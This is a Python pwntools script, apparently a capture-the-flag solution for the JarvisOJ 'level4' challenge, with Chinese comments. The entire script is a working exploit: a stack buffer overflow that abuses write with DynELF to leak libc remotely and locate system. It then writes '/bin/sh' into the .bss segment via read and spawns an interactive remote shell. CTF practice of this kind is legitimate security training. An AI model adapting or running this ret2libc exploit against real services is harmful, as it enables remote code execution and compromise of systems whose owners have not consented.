# -*- coding: utf-8 -*-
from pwn import *

r = remote('pwn2.jarvisoj.com', 9880)

elf = ELF('./level4')

write_plt = elf.symbols['write']
vul_addr  = 0x804844b

junk = b'a'*(0x88+4)

#DynELF函数
#条件：能够实现任意地址读，并且能够反复触发
def leak(address):
    #                 ret_addr         write返回地址   参数1    参数2          参数3
    payload1 = junk + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)
    r.sendline(payload1)
    data = r.recv(4)
    print("=>", data)
    return data
    
#使用DynELF远程泄露libc
memory = DynELF(leak, elf=elf)
#搜索远程libc中system函数的地址
system_addr = memory.lookup('system', 'libc')
print("system address=>", hex(system_addr))

bss_addr = 0x804a024
read_plt = elf.symbols['read']

#                 ret_addr        read返回地址    参数1    参数2          参数3
payload2 = junk + p32(read_plt) + p32(vul_addr) + p32(0) + p32(bss_addr) + p32(8)
r.sendline(payload2)
#在bss段中写入'/bin/sh'，注意00截断
r.send(b'/bin/sh\x00')

#调用system('bin/sh')
payload3 = junk + p32(system_addr) + p32(0) + p32(bss_addr)
r.sendline(payload3)

r.interactive()
